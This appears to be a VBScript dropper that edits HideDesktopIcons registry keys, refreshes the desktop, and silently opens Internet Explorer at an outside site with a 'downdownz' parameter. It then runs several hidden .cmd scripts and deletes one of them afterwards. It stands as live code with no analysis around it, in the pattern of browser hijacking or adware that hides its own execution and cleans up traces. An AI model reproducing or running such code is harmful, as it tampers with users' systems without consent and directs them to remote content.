Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
Rem 
RegPath="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}"
WSHShell.SendKeys "{F5}"

DIM objShell
set objShell=Wscript.createObject("wscript.shell")
iReturn=objShell.Run("cmd.exe /C  start  /min       iexplore http://www.4555.net/index2.html?downdownz", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\tool.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\run.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\se.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\fav.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\copy.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\cc.cmd", 0, TRUE)

WScript.Sleep    3000
iReturn=objShell.Run("cmd.exe /C del .\run.cmd", 0, TRUE)
